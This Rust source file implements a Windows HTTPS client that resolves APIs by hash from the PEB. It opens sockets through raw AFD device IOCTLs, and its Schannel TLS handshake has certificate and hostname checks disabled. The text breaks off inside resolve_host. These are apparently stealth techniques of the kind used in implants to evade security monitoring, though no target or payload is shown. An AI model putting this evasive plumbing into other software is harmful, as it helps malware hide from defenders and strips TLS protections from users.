use crate::resolve2::{
    FnNtCreateFile, FnNtDeviceIoControlFile, HASH_ACQUIRE_CREDENTIALS, HASH_DECRYPT_MESSAGE,
    HASH_DELETE_SECURITY_CONTEXT, HASH_ENCRYPT_MESSAGE, HASH_FREE_CREDENTIALS,
    HASH_INITIALIZE_SECURITY_CONTEXT, HASH_NT_CREATE_FILE, HASH_NT_DEVICE_IO, HASH_NTDLL,
    HASH_SCHANNEL, SECBUFFER_DATA, get_proc_by_hash, hash_str,
};
use crate::types::{
    AfdBufX64, AfdRecvInfoX64, IO_STATUS_BLOCK, OBJECT_ATTRIBUTES, SecBuffer, SecBufferDesc,
    UNICODE_STRING,
};
use crate::utils::get_module_by_hash;
use core::ffi::c_void;
use core::ptr;

const IOCTL_AFD_CONNECT: u32 = 0x00012007;
const IOCTL_AFD_SEND: u32 = 0x0001201F;
const IOCTL_AFD_RECV: u32 = 0x00012017;

const OBJ_CASE_INSENSITIVE: u32 = 0x0000_0040;

// Schannel / SSPI
const SECPKG_CRED_OUTBOUND: u32 = 0x0000_0002;
const ISC_REQ_SEQUENCE_DETECT: u32 = 0x0000_0004;
const ISC_REQ_REPLAY_DETECT: u32 = 0x0000_0008;
const ISC_REQ_CONFIDENTIALITY: u32 = 0x0000_0010;
const ISC_REQ_STREAM: u32 = 0x0000_8000;
const ISC_REQ_MANUAL_CRED_VALIDATION: u32 = 0x0008_0000;

const ISC_FLAGS: u32 = ISC_REQ_SEQUENCE_DETECT
    | ISC_REQ_REPLAY_DETECT
    | ISC_REQ_CONFIDENTIALITY
    | ISC_REQ_STREAM
    | ISC_REQ_MANUAL_CRED_VALIDATION;

const SECBUFFER_TOKEN: u32 = 2;
const SECBUFFER_EMPTY: u32 = 0;
const SECBUFFER_VERSION: u32 = 0;

const SEC_I_CONTINUE_NEEDED: i32 = 0x0009_0312_u32 as i32;
const SEC_E_OK: i32 = 0;
const SEC_E_INCOMPLETE_MSG: i32 = 0x8009_0318_u32 as i32;

#[repr(C)]
struct CredHandle {
    dw_lower: usize,
    dw_upper: usize,
}

#[repr(C)]
struct CtxtHandle {
    dw_lower: usize,
    dw_upper: usize,
}

#[repr(C)]
struct TimeStamp {
    low: u32,
    high: u32,
}

#[repr(C)]
struct SchannelCred {
    dw_version: u32,
    c_creds: u32,
    pa_cred: *mut c_void,
    h_root_store: *mut c_void,
    c_mappers: u32,
    _pad1: u32,
    aph_mappers: *mut c_void,
    c_supported_algs: u32,
    _pad2: u32,
    palg_supported_algs: *mut c_void,
    grbit_enabled_protocols: u32,
    dw_minimum_cipher_strength: u32,
    dw_maximum_cipher_strength: u32,
    dw_session_lifespan: u32,
    dw_flags: u32,
    dw_cred_format: u32,
}

type FnAcquireCredentials = unsafe extern "system" fn(
    *mut u16,
    *mut u16,
    u32,
    *mut c_void,
    *mut c_void,
    *mut c_void,
    *mut c_void,
    *mut CredHandle,
    *mut TimeStamp,
) -> i32;

type FnInitializeSecurityContext = unsafe extern "system" fn(
    *mut CredHandle,
    *mut CtxtHandle,
    *mut u16,
    u32,
    u32,
    u32,
    *mut SecBufferDesc,
    u32,
    *mut CtxtHandle,
    *mut SecBufferDesc,
    *mut u32,
    *mut TimeStamp,
) -> i32;

type FnEncryptMessage =
    unsafe extern "system" fn(*mut CtxtHandle, u32, *mut SecBufferDesc, u32) -> i32;
type FnDecryptMessage =
    unsafe extern "system" fn(*mut CtxtHandle, *mut SecBufferDesc, u32, *mut u32) -> i32;
type FnFreeCredentials = unsafe extern "system" fn(*mut CredHandle) -> i32;
type FnDeleteSecurityCtx = unsafe extern "system" fn(*mut CtxtHandle) -> i32;

pub struct NtSocket {
    handle: *mut c_void,
}

pub struct TlsContext {
    cred: CredHandle,
    ctx: CtxtHandle,
    fn_encrypt: FnEncryptMessage,
    fn_decrypt: FnDecryptMessage,
    fn_free_cred: FnFreeCredentials,
    fn_del_ctx: FnDeleteSecurityCtx,
    leftover: Vec<u8>,
}

pub struct HttpResponse {
    pub status: u16,
    pub headers: Vec<u8>,
    pub body: Vec<u8>,
}

unsafe fn resolve_nt_fn(hash: u32) -> Option<*mut c_void> {
    let ntdll = get_module_by_hash(HASH_NTDLL)?;
    get_proc_by_hash(ntdll, hash)
}

unsafe fn resolve_schannel_fn(hash: u32) -> Option<*mut c_void> {
    let kernel32 = get_module_by_hash(hash_str("kernel32.dll"))?;
    type FnLoadLibraryA = unsafe extern "system" fn(*const u8) -> *mut c_void;
    let fn_load: FnLoadLibraryA =
        core::mem::transmute(get_proc_by_hash(kernel32, hash_str("LoadLibraryA"))?);
    fn_load(b"sspicli.dll\0".as_ptr());
    fn_load(b"secur32.dll\0".as_ptr());
    fn_load(b"schannel.dll\0".as_ptr());

    let dlls: [(u32, &[u8]); 3] = [
        (hash_str("sspicli.dll"), b"sspicli"),
        (hash_str("secur32.dll"), b"secur32"),
        (HASH_SCHANNEL, b"schannel"),
    ];

    for (h_dll, label) in &dlls {
        if let Some(m) = get_module_by_hash(*h_dll) {
            if let Some(f) = get_proc_by_hash(m, hash) {
                println!(
                    "[DEBUG] resolve_schannel_fn: found in {} hash={:#010x}",
                    core::str::from_utf8_unchecked(label),
                    hash
                );
                return Some(f);
            }
        }
    }

    println!("[DEBUG] resolve_schannel_fn FAILED hash={:#010x}", hash);
    None
}

unsafe fn nt_create_socket() -> Option<*mut c_void> {
    // WSAStartup d'abord
    let kernel32 = get_module_by_hash(hash_str("kernel32.dll"))?;
    type FnLoadLibraryA = unsafe extern "system" fn(*const u8) -> *mut c_void;
    let fn_load: FnLoadLibraryA =
        core::mem::transmute(get_proc_by_hash(kernel32, hash_str("LoadLibraryA"))?);
    let ws2 = fn_load(b"ws2_32.dll\0".as_ptr());
    if ws2.is_null() {
        return None;
    }
    #[repr(C)]
    struct WsaData {
        _data: [u8; 400],
    }
    type FnWSAStartup = unsafe extern "system" fn(u16, *mut WsaData) -> i32;
    let fn_wsa: FnWSAStartup = core::mem::transmute(get_proc_by_hash(ws2, hash_str("WSAStartup"))?);
    let mut wsa_data: WsaData = core::mem::zeroed();
    fn_wsa(0x0202, &mut wsa_data);

    let nt_create: FnNtCreateFile = core::mem::transmute(resolve_nt_fn(HASH_NT_CREATE_FILE)?);

    // \Device\Afd\Endpoint
    const AFD_ENDPOINT: &[u16] = &[
        b'\\' as u16,
        b'D' as u16,
        b'e' as u16,
        b'v' as u16,
        b'i' as u16,
        b'c' as u16,
        b'e' as u16,
        b'\\' as u16,
        b'A' as u16,
        b'f' as u16,
        b'd' as u16,
        b'\\' as u16,
        b'E' as u16,
        b'n' as u16,
        b'd' as u16,
        b'p' as u16,
        b'o' as u16,
        b'i' as u16,
        b'n' as u16,
        b't' as u16,
    ];

    let mut us = UNICODE_STRING {
        length: (AFD_ENDPOINT.len() * 2) as u16,
        maximum_length: (AFD_ENDPOINT.len() * 2) as u16,
        _padding: 0,
        buffer: AFD_ENDPOINT.as_ptr() as *mut u16,
    };
    let mut oa = OBJECT_ATTRIBUTES {
        length: core::mem::size_of::<OBJECT_ATTRIBUTES>() as u32,
        root_directory: ptr::null_mut(),
        object_name: &mut us,
        attributes: OBJ_CASE_INSENSITIVE,
        security_descriptor: ptr::null_mut(),
        security_quality_of_service: ptr::null_mut(),
    };
    let mut isb = IO_STATUS_BLOCK {
        status: 0,
        information: 0,
    };
    let mut handle: *mut c_void = ptr::null_mut();

    // \Device\Tcp
    let transport: &[u8] = &[
        b'\\', 0, b'D', 0, b'e', 0, b'v', 0, b'i', 0, b'c', 0, b'e', 0, b'\\', 0, b'T', 0, b'c', 0,
        b'p', 0,
    ];

    let ea_value_len: u16 = 4 + 4 + 4 + 4 + 4 + 4 + 22 + 6;
    let ea_total = 8 + 16 + ea_value_len as usize;

    let mut raw_ea = [0u8; 80];
    raw_ea[0..4].copy_from_slice(&0u32.to_le_bytes());
    raw_ea[4] = 0;
    raw_ea[5] = 15;
    raw_ea[6..8].copy_from_slice(&ea_value_len.to_le_bytes());
    raw_ea[8..24].copy_from_slice(b"AfdOpenPacketXX\0");
    raw_ea[24..28].copy_from_slice(&0x00000100u32.to_le_bytes());
    raw_ea[28..32].copy_from_slice(&0u32.to_le_bytes());
    raw_ea[32..36].copy_from_slice(&2u32.to_le_bytes());
    raw_ea[36..40].copy_from_slice(&1u32.to_le_bytes());
    raw_ea[40..44].copy_from_slice(&6u32.to_le_bytes());
    raw_ea[44..48].copy_from_slice(&22u32.to_le_bytes());
    raw_ea[48..70].copy_from_slice(transport);

    let status = nt_create(
        &mut handle,
        0xC014_0000u64,
        &mut oa,
        &mut isb,
        ptr::null_mut(),
        0,
        7,
        3,
        0,
        raw_ea.as_mut_ptr() as *mut c_void,
        ea_total as u32,
    );

    println!(
        "[DEBUG] NtCreateFile status={:#010x} handle={:?}",
        status as u32, handle
    );

    if status < 0 || handle.is_null() {
        return None;
    }
    Some(handle)
}

unsafe fn nt_tcp_connect(handle: *mut c_void, ip: [u8; 4], port: u16) -> bool {
    let nt_io: FnNtDeviceIoControlFile =
        core::mem::transmute(match resolve_nt_fn(HASH_NT_DEVICE_IO) {
            Some(f) => f,
            None => return false,
        });

    const IOCTL_AFD_BIND: u32 = 0x12003;
    const IOCTL_AFD_CONNECT: u32 = 0x12007;
    const STATUS_PENDING: i32 = 0x103;

    // Bind
    let mut bind_in = [0u8; 0x1000];
    bind_in[4] = 0x01;
    bind_in[8] = 0x10;
    bind_in[10] = 0x02;
    let mut bind_out = [0u8; 0x1000];
    let mut isb = IO_STATUS_BLOCK {
        status: 0,
        information: 0,
    };
    nt_io(
        handle,
        ptr::null_mut(),
        ptr::null_mut(),
        ptr::null_mut(),
        &mut isb,
        IOCTL_AFD_BIND,
        bind_in.as_mut_ptr() as *mut c_void,
        bind_in.len() as u32,
        bind_out.as_mut_ptr() as *mut c_void,
        bind_out.len() as u32,
    );
    println!("[DEBUG] IOCTL_AFD_BIND status={:#010x}", isb.status as u32);

    let ntdll = match get_module_by_hash(HASH_NTDLL) {
        Some(m) => m,
        None => return false,
    };

    type FnNtCreateEvent =
        unsafe extern "system" fn(*mut *mut c_void, u32, *mut c_void, u32, i32) -> i32;
    type FnNtWaitForSingleObject = unsafe extern "system" fn(*mut c_void, i32, *mut c_void) -> i32;

    let fn_create_event: FnNtCreateEvent =
        core::mem::transmute(match get_proc_by_hash(ntdll, hash_str("NtCreateEvent")) {
            Some(f) => f,
            None => return false,
        });
    let fn_wait: FnNtWaitForSingleObject = core::mem::transmute(
        match get_proc_by_hash(ntdll, hash_str("NtWaitForSingleObject")) {
            Some(f) => f,
            None => return false,
        },
    );

    let mut event: *mut c_void = ptr::null_mut();
    fn_create_event(&mut event, 0x1F0003, ptr::null_mut(), 1, 0);
    println!("[DEBUG] event = {:?}", event);

    let port_be = port.to_be_bytes();
    let mut buf = [0u8; 46];
    buf[0] = 0;
    buf[24..28].copy_from_slice(&1u32.to_le_bytes());
    buf[28..30].copy_from_slice(&14u16.to_le_bytes());
    buf[30..32].copy_from_slice(&2u16.to_le_bytes());
    buf[32..34].copy_from_slice(&port_be);
    buf[34..38].copy_from_slice(&ip);

    let mut isb2 = IO_STATUS_BLOCK {
        status: 0,
        information: 0,
    };
    let status = nt_io(
        handle,
        event,
        ptr::null_mut(),
        ptr::null_mut(),
        &mut isb2,
        IOCTL_AFD_CONNECT,
        buf.as_mut_ptr() as *mut c_void,
        buf.len() as u32,
        ptr::null_mut(),
        0u32,
    );

    println!("[DEBUG] IOCTL_AFD_CONNECT status={:#010x}", status as u32);

    if status == STATUS_PENDING {
        let wait_ret = fn_wait(event, 0, ptr::null_mut());
        println!(
            "[DEBUG] NtWaitForSingleObject ret={:#010x} isb.status={:#010x}",
            wait_ret as u32, isb2.status as u32
        );
    }

    if let Some(fn_close) = resolve_nt_fn(hash_str("NtClose")) {
        let f: unsafe extern "system" fn(*mut c_void) -> i32 = core::mem::transmute(fn_close);
        f(event);
    }

    status >= 0 && isb2.status >= 0
}

unsafe fn nt_afd_bind(handle: *mut c_void) -> bool {
    let nt_io: FnNtDeviceIoControlFile =
        core::mem::transmute(resolve_nt_fn(HASH_NT_DEVICE_IO).unwrap());

    const IOCTL_AFD_BIND: u32 = 0x12003;

    let mut buf = [0u8; 0x1000];
    buf[4] = 0x01;
    buf[8] = 0x10;
    buf[10] = 0x02;

    let mut out = [0u8; 0x1000];
    let mut isb = IO_STATUS_BLOCK {
        status: 0,
        information: 0,
    };

    let status = nt_io(
        handle,
        ptr::null_mut(),
        ptr::null_mut(),
        ptr::null_mut(),
        &mut isb,
        IOCTL_AFD_BIND,
        buf.as_mut_ptr() as *mut c_void,
        buf.len() as u32,
        out.as_mut_ptr() as *mut c_void,
        out.len() as u32,
    );

    println!("[DEBUG] IOCTL_AFD_BIND status={:#010x}", status as u32);
    status >= 0
}

unsafe fn nt_send_raw(handle: *mut c_void, data: &[u8]) -> bool {
    let nt_io: FnNtDeviceIoControlFile =
        core::mem::transmute(match resolve_nt_fn(HASH_NT_DEVICE_IO) {
            Some(f) => f,
            None => return false,
        });

    let ntdll = match get_module_by_hash(HASH_NTDLL) {
        Some(m) => m,
        None => return false,
    };

    type FnNtCreateEvent =
        unsafe extern "system" fn(*mut *mut c_void, u32, *mut c_void, u32, i32) -> i32;
    type FnNtWaitForSingleObject = unsafe extern "system" fn(*mut c_void, i32, *mut c_void) -> i32;

    let fn_create_event: FnNtCreateEvent =
        core::mem::transmute(match get_proc_by_hash(ntdll, hash_str("NtCreateEvent")) {
            Some(f) => f,
            None => return false,
        });
    let fn_wait: FnNtWaitForSingleObject = core::mem::transmute(
        match get_proc_by_hash(ntdll, hash_str("NtWaitForSingleObject")) {
            Some(f) => f,
            None => return false,
        },
    );

    let mut event: *mut c_void = ptr::null_mut();
    fn_create_event(&mut event, 0x1F0003, ptr::null_mut(), 1, 0);

    let mut wsabuf = [0u8; 16];
    wsabuf[0..4].copy_from_slice(&(data.len() as u32).to_le_bytes());
    wsabuf[8..16].copy_from_slice(&(data.as_ptr() as u64).to_le_bytes());

    let mut send_in = [0u8; 24];
    send_in[0..8].copy_from_slice(&(wsabuf.as_ptr() as u64).to_le_bytes());
    send_in[8..12].copy_from_slice(&1u32.to_le_bytes());
    send_in[12..16].copy_from_slice(&0u32.to_le_bytes());
    send_in[16..20].copy_from_slice(&0u32.to_le_bytes());

    let mut isb = IO_STATUS_BLOCK {
        status: 0,
        information: 0,
    };

    let status = nt_io(
        handle,
        event,
        ptr::null_mut(),
        ptr::null_mut(),
        &mut isb,
        IOCTL_AFD_SEND,
        send_in.as_mut_ptr() as *mut c_void,
        24u32,
        ptr::null_mut(),
        0u32,
    );

    println!("[DEBUG] send status={:#010x}", status as u32);

    if status == 0x103 {
        fn_wait(event, 0, ptr::null_mut());
        println!(
            "[DEBUG] send after wait isb.status={:#010x} info={}",
            isb.status as u32, isb.information
        );
    }

    if let Some(fn_close) = resolve_nt_fn(hash_str("NtClose")) {
        let f: unsafe extern "system" fn(*mut c_void) -> i32 = core::mem::transmute(fn_close);
        f(event);
    }

    status >= 0 && isb.status >= 0
}

unsafe fn nt_recv_raw(handle: *mut c_void, out: &mut Vec<u8>) -> bool {
    let nt_io: FnNtDeviceIoControlFile =
        core::mem::transmute(match resolve_nt_fn(HASH_NT_DEVICE_IO) {
            Some(f) => f,
            None => return false,
        });

    let ntdll = match get_module_by_hash(HASH_NTDLL) {
        Some(m) => m,
        None => return false,
    };

    type FnNtCreateEvent =
        unsafe extern "system" fn(*mut *mut c_void, u32, *mut c_void, u32, i32) -> i32;
    type FnNtWaitForSingleObject = unsafe extern "system" fn(*mut c_void, i32, *mut c_void) -> i32;

    let fn_create_event: FnNtCreateEvent =
        core::mem::transmute(match get_proc_by_hash(ntdll, hash_str("NtCreateEvent")) {
            Some(f) => f,
            None => return false,
        });
    let fn_wait: FnNtWaitForSingleObject = core::mem::transmute(
        match get_proc_by_hash(ntdll, hash_str("NtWaitForSingleObject")) {
            Some(f) => f,
            None => return false,
        },
    );

    const IOCTL_AFD_RECV: u32 = 0x00012017;

    loop {
        let mut tmp = vec![0u8; 16384];

        let mut wsabuf = [0u8; 16];
        wsabuf[0..4].copy_from_slice(&(tmp.len() as u32).to_le_bytes());
        let ptr_val = tmp.as_mut_ptr() as u64;
        wsabuf[8..16].copy_from_slice(&ptr_val.to_le_bytes());

        let mut recv_in = [0u8; 24];
        let wsabuf_ptr = wsabuf.as_mut_ptr() as u64;
        recv_in[0..8].copy_from_slice(&wsabuf_ptr.to_le_bytes());
        recv_in[8..12].copy_from_slice(&1u32.to_le_bytes());
        recv_in[12..16].copy_from_slice(&0u32.to_le_bytes());
        recv_in[16..20].copy_from_slice(&0x20u32.to_le_bytes());

        let mut event: *mut c_void = ptr::null_mut();
        fn_create_event(&mut event, 0x1F0003, ptr::null_mut(), 1, 0);

        let mut isb = IO_STATUS_BLOCK {
            status: 0,
            information: 0,
        };

        let status = nt_io(
            handle,
            event,
            ptr::null_mut(),
            ptr::null_mut(),
            &mut isb,
            IOCTL_AFD_RECV,
            recv_in.as_mut_ptr() as *mut c_void,
            24u32,
            ptr::null_mut(),
            0u32,
        );

        println!("[DEBUG] recv status={:#010x}", status as u32);

        if status == 0x103 {
            fn_wait(event, 0, ptr::null_mut());
            println!(
                "[DEBUG] recv after wait isb.status={:#010x} info={}",
                isb.status as u32, isb.information
            );
        }

        if let Some(fn_close) = resolve_nt_fn(hash_str("NtClose")) {
            let f: unsafe extern "system" fn(*mut c_void) -> i32 = core::mem::transmute(fn_close);
            f(event);
        }

        if status < 0 || isb.status < 0 || isb.information == 0 {
            break;
        }

        out.extend_from_slice(&tmp[..isb.information]);

        if isb.information < tmp.len() {
            break;
        }
    }

    !out.is_empty()
}

// ────────────────────────────────────────────────────────────────
// Handshake TLS via Schannel
// ────────────────────────────────────────────────────────────────

fn to_utf16(s: &str) -> Vec<u16> {
    s.encode_utf16().chain(core::iter::once(0)).collect()
}

const UNISP_NAME: &str = "Microsoft Unified Security Protocol Provider";

unsafe fn tls_handshake(socket: &NtSocket, hostname: &str) -> Option<TlsContext> {
    let fn_acq: FnAcquireCredentials =
        core::mem::transmute(resolve_schannel_fn(HASH_ACQUIRE_CREDENTIALS)?);
    let fn_isc: FnInitializeSecurityContext =
        core::mem::transmute(resolve_schannel_fn(HASH_INITIALIZE_SECURITY_CONTEXT)?);
    let fn_enc: FnEncryptMessage = core::mem::transmute(resolve_schannel_fn(HASH_ENCRYPT_MESSAGE)?);
    let fn_dec: FnDecryptMessage = core::mem::transmute(resolve_schannel_fn(HASH_DECRYPT_MESSAGE)?);
    let fn_free: FnFreeCredentials =
        core::mem::transmute(resolve_schannel_fn(HASH_FREE_CREDENTIALS)?);
    let fn_del: FnDeleteSecurityCtx =
        core::mem::transmute(resolve_schannel_fn(HASH_DELETE_SECURITY_CONTEXT)?);

    let mut scred: SchannelCred = core::mem::zeroed();
    scred.dw_version = 4; // SCHANNEL_CRED_VERSION
    scred.dw_flags = 0x0000_0008  // SCH_CRED_MANUAL_CRED_VALIDATION
                   | 0x0000_0002  // SCH_CRED_NO_DEFAULT_CREDS
                   | 0x0000_0010; // SCH_CRED_NO_SERVERNAME_CHECK

    let mut cred = CredHandle {
        dw_lower: 0,
        dw_upper: 0,
    };
    let mut ts = TimeStamp { low: 0, high: 0 };
    let mut pkg = to_utf16(UNISP_NAME);
    println!(
        "[DEBUG] size SchannelCred = {}",
        core::mem::size_of::<SchannelCred>()
    );
    debug_assert_eq!(core::mem::size_of::<SchannelCred>(), 0x50);
    println!("[DEBUG] avant fn_acq");
    let s = fn_acq(
        ptr::null_mut(),
        pkg.as_mut_ptr(),
        SECPKG_CRED_OUTBOUND,
        ptr::null_mut(),
        &mut scred as *mut _ as *mut c_void,
        ptr::null_mut(),
        ptr::null_mut(),
        &mut cred,
        &mut ts,
    );
    println!("[DEBUG] AcquireCredentialsHandleW ret={:#010x}", s as u32);
    if s != SEC_E_OK {
        println!("[DEBUG] ECHEC AcquireCredentials");
        return None;
    }
    println!("[DEBUG] cred = {:x} {:x}", cred.dw_lower, cred.dw_upper);
    if s != SEC_E_OK {
        return None;
    }

    let mut ctx = CtxtHandle {
        dw_lower: 0,
        dw_upper: 0,
    };
    let mut ctx_init = false;
    let mut target = to_utf16(hostname);
    let mut attrs: u32 = 0;
    let mut out_buf_data = vec![0u8; 32768];
    let mut recv_buf: Vec<u8> = Vec::new();
    let mut leftover: Vec<u8> = Vec::new();

    const SECBUFFER_EXTRA: u32 = 5;

    loop {
        let mut out_sec = SecBuffer {
            cb_buffer: out_buf_data.len() as u32,
            buffer_type: SECBUFFER_TOKEN,
            pv_buffer: out_buf_data.as_mut_ptr() as *mut c_void,
        };
        let mut out_desc = SecBufferDesc {
            ul_version: SECBUFFER_VERSION,
            c_buffers: 1,
            p_buffers: &mut out_sec,
        };

        let mut in_sec = [
            SecBuffer {
                cb_buffer: recv_buf.len() as u32,
                buffer_type: 2,
                pv_buffer: recv_buf.as_mut_ptr() as *mut c_void,
            },
            SecBuffer {
                cb_buffer: 0,
                buffer_type: 0,
                pv_buffer: ptr::null_mut(),
            },
        ];
        let mut in_desc = SecBufferDesc {
            ul_version: SECBUFFER_VERSION,
            c_buffers: 2,
            p_buffers: in_sec.as_mut_ptr(),
        };

        let (ph_ctx, p_in_desc, ph_new_ctx) = if !ctx_init {
            (
                ptr::null_mut::<CtxtHandle>(),
                ptr::null_mut::<SecBufferDesc>(),
                &mut ctx as *mut CtxtHandle,
            )
        } else {
            (
                &mut ctx as *mut CtxtHandle,
                &mut in_desc as *mut SecBufferDesc,
                ptr::null_mut::<CtxtHandle>(),
            )
        };

        let ret = fn_isc(
            &mut cred,
            ph_ctx,
            target.as_mut_ptr(),
            ISC_FLAGS,
            0,
            0,
            p_in_desc,
            0,
            ph_new_ctx,
            &mut out_desc,
            &mut attrs,
            &mut ts,
        );
        println!("[DEBUG] InitializeSecurityContext ret={:#010x}", ret as u32);
        ctx_init = true;

        let mut extra: Vec<u8> = Vec::new();
        for b in &in_sec {
            if b.buffer_type == SECBUFFER_EXTRA && b.cb_buffer > 0 {
                let total = recv_buf.len();
                let n = b.cb_buffer as usize;
                if n <= total {
                    extra.extend_from_slice(&recv_buf[total - n..]);
                }
            }
        }

        if out_sec.cb_buffer > 0 {
            let slice =
                core::slice::from_raw_parts(out_buf_data.as_ptr(), out_sec.cb_buffer as usize);

            nt_send_raw(socket.handle, slice);
        }

        if ret == SEC_E_OK {
            leftover = extra;
            break;
        }

        if ret == SEC_E_INCOMPLETE_MSG {
            let mut chunk = Vec::new();
            if !nt_recv_raw(socket.handle, &mut chunk) {
                fn_free(&mut cred);
                return None;
            }
            recv_buf.extend_from_slice(&chunk);
            continue;
        }

        if ret != SEC_I_CONTINUE_NEEDED {
            println!("[DEBUG] ISC failed ret={:#010x}", ret as u32);
            fn_free(&mut cred);
            return None;
        }

        recv_buf = extra;
        let mut chunk = Vec::new();
        if !nt_recv_raw(socket.handle, &mut chunk) {
            fn_free(&mut cred);
            return None;
        }
        recv_buf.extend_from_slice(&chunk);
    }

    Some(TlsContext {
        cred,
        ctx,
        fn_encrypt: fn_enc,
        fn_decrypt: fn_dec,
        fn_free_cred: fn_free,
        fn_del_ctx: fn_del,
        leftover,
    })
}

unsafe fn tls_send(socket: &NtSocket, tls: &mut TlsContext, plaintext: &[u8]) -> bool {
    const HEADER_SZ: usize = 5;
    const TRAILER_SZ: usize = 64;

    let mut buf = vec![0u8; HEADER_SZ + plaintext.len() + TRAILER_SZ];
    buf[HEADER_SZ..HEADER_SZ + plaintext.len()].copy_from_slice(plaintext);

    let mut sec_bufs = [
        SecBuffer {
            cb_buffer: HEADER_SZ as u32,
            buffer_type: 7,
            pv_buffer: buf.as_mut_ptr() as *mut c_void,
        },
        SecBuffer {
            cb_buffer: plaintext.len() as u32,
            buffer_type: SECBUFFER_DATA,
            pv_buffer: buf[HEADER_SZ..].as_mut_ptr() as *mut c_void,
        },
        SecBuffer {
            cb_buffer: TRAILER_SZ as u32,
            buffer_type: 6,
            pv_buffer: buf[HEADER_SZ + plaintext.len()..].as_mut_ptr() as *mut c_void,
        },
        SecBuffer {
            cb_buffer: 0,
            buffer_type: SECBUFFER_EMPTY,
            pv_buffer: ptr::null_mut(),
        },
    ];
    let mut desc = SecBufferDesc {
        ul_version: SECBUFFER_VERSION,
        c_buffers: 4,
        p_buffers: sec_bufs.as_mut_ptr(),
    };
    let ret = (tls.fn_encrypt)(&mut tls.ctx, 0, &mut desc, 0);
    if ret != SEC_E_OK {
        return false;
    }

    let total = sec_bufs[0].cb_buffer as usize
        + sec_bufs[1].cb_buffer as usize
        + sec_bufs[2].cb_buffer as usize;
    nt_send_raw(socket.handle, &buf[..total])
}

unsafe fn tls_recv(socket: &NtSocket, tls: &mut TlsContext, out: &mut Vec<u8>) -> bool {
    let mut raw: Vec<u8> = Vec::new();
    if !tls.leftover.is_empty() {
        raw.append(&mut tls.leftover);
    }

    loop {
        let mut sec_bufs = [
            SecBuffer {
                cb_buffer: raw.len() as u32,
                buffer_type: SECBUFFER_DATA,
                pv_buffer: raw.as_mut_ptr() as *mut c_void,
            },
            SecBuffer {
                cb_buffer: 0,
                buffer_type: SECBUFFER_EMPTY,
                pv_buffer: ptr::null_mut(),
            },
            SecBuffer {
                cb_buffer: 0,
                buffer_type: SECBUFFER_EMPTY,
                pv_buffer: ptr::null_mut(),
            },
            SecBuffer {
                cb_buffer: 0,
                buffer_type: SECBUFFER_EMPTY,
                pv_buffer: ptr::null_mut(),
            },
        ];
        let mut desc = SecBufferDesc {
            ul_version: SECBUFFER_VERSION,
            c_buffers: 4,
            p_buffers: sec_bufs.as_mut_ptr(),
        };
        let mut qop: u32 = 0;
        let ret = (tls.fn_decrypt)(&mut tls.ctx, &mut desc, 0, &mut qop);

        if ret == SEC_E_OK {
            for sb in &sec_bufs {
                if sb.buffer_type == SECBUFFER_DATA && sb.cb_buffer > 0 {
                    let slice = core::slice::from_raw_parts(
                        sb.pv_buffer as *const u8,
                        sb.cb_buffer as usize,
                    );
                    out.extend_from_slice(slice);
                }
                if sb.buffer_type == 5 && sb.cb_buffer > 0 {
                    let slice = core::slice::from_raw_parts(
                        sb.pv_buffer as *const u8,
                        sb.cb_buffer as usize,
                    );
                    tls.leftover.extend_from_slice(slice);
                }
            }
            break;
        }

        if ret == SEC_E_INCOMPLETE_MSG {
            let mut chunk = Vec::new();
            if !nt_recv_raw(socket.handle, &mut chunk) {
                break;
            }
            raw.extend_from_slice(&chunk);
        } else {
            break;
        }
    }
    !out.is_empty()
}

fn build_request(
    method: &str,
    host: &str,
    path: &str,
    headers: &[(&str, &str)],
    body: &[u8],
) -> Vec<u8> {
    let mut req = Vec::with_capacity(512);
    req.extend_from_slice(method.as_bytes());
    req.extend_from_slice(b" ");
    req.extend_from_slice(path.as_bytes());
    req.extend_from_slice(b" HTTP/1.1\r\nHost: ");
    req.extend_from_slice(host.as_bytes());
    req.extend_from_slice(b"\r\nConnection: close\r\n");
    for (k, v) in headers {
        req.extend_from_slice(k.as_bytes());
        req.extend_from_slice(b": ");
        req.extend_from_slice(v.as_bytes());
        req.extend_from_slice(b"\r\n");
    }
    if !body.is_empty() {
        req.extend_from_slice(b"Content-Length: ");
        req.extend_from_slice(format!("{}", body.len()).as_bytes());
        req.extend_from_slice(b"\r\n");
    }
    req.extend_from_slice(b"\r\n");
    req.extend_from_slice(body);
    req
}

fn parse_response(raw: &[u8]) -> HttpResponse {
    let sep = b"\r\n\r\n";
    let body_start = raw
        .windows(4)
        .position(|w| w == sep)
        .map(|i| i + 4)
        .unwrap_or(raw.len());
    let header_part = &raw[..body_start];
    let status = header_part
        .get(9..12)
        .and_then(|s| core::str::from_utf8(s).ok())
        .and_then(|s| s.parse().ok())
        .unwrap_or(0);
    HttpResponse {
        status,
        headers: header_part.to_vec(),
        body: raw[body_start..].to_vec(),
    }
}

pub unsafe fn resolve_host(host: &str) -> Option<[u8; 4]> {
    let parts: Vec<&str> = host.split('.').collect();
    if parts.len() == 4 {
        let parsed: Option<Vec<u8>> = parts.iter().map(|p| p.parse::<u8>().ok()).collect();
        if let Some(v) = parsed {
            return Some([v[0], v[1], v[2], v[3]]);
        }
    }

    use crate::types::{LDR_DATA_TABLE_ENTRY, LIST_ENTRY, PEB};
    use crate::utils::get_peb;
    use crate::utils::hash_utf16_lower;

    let peb = get_peb() as *mut PEB;
    let ldr = (*peb).ldr;
    let head = &mut (*ldr).in_memory_order_module_list as *mut LIST_ENTRY;
    let mut cur = (*head).flink;
    println!("[DEBUG] Modules dans le PEB:");
    while !cur.is_null() && cur != head {
        let entry = (cur as usize
            - core::mem::offset_of!(LDR_DATA_TABLE_ENTRY, in_memory_order_links))
            as *mut LDR_DATA_TABLE_ENTRY;
        let us = &(*entry).base_dll_name;
        if !us.buffer.is_null() && us.length > 0 {
            let slice = core::slice::from_raw_parts(us.buffer, (us.length / 2) as usize);
            let name: String = slice
                .iter()
                .map(|&c| if c < 128 { c as u8 as char } else { '?' })
                .collect();
            let h = hash_utf16_lower(slice);
            let h_kernel = hash_str("kernel32.dll");
            println!(
                "  {} → hash={:#010x} (kernel32.dll hash={:#010x} match={})",
                name,
                h,
                h_kernel,
                h == h_kernel
            );
        }
        cur = (*cur).flink;
    }

    let kernel32 = get_module_by_hash(hash_str("kernel32.dll"));
    println!("[DEBUG] kernel32 = {:?}", kernel32);
    let kernel32 = kernel32?;

    type FnLoadLibraryA = unsafe extern "system" fn(*const u8) -> *mut c_void;
    let load_fn = get_proc_by_hash(kernel32, hash_str("LoadLibraryA"));
    println!("[DEBUG] LoadLibraryA = {:?}", load_fn);
    let fn_load: FnLoadLibraryA = core::mem::transmute(load_fn?);

    let ws2_name = b"ws2_32.dll\0";
